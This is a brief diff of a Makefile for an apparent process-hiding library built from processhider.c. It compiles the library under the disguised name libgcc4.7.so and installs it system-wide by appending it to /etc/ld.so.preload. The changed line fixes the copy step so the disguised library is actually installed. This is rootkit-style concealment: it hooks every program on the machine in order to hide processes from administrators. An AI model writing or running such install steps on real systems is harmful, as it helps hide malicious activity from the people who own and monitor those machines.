@@ -4,7 +4,7 @@ libprocesshider.so: processhider.c
 	gcc -Wall -fPIC -shared -o libgcc4.7.so processhider.c -ldl
 
 install:
-	cp $OUT /usr/local/lib
+	cp libgcc4.7.so /usr/local/lib
 	echo /usr/local/lib/libgcc4.7.so >> /etc/ld.so.preload
 
 .PHONY clean:
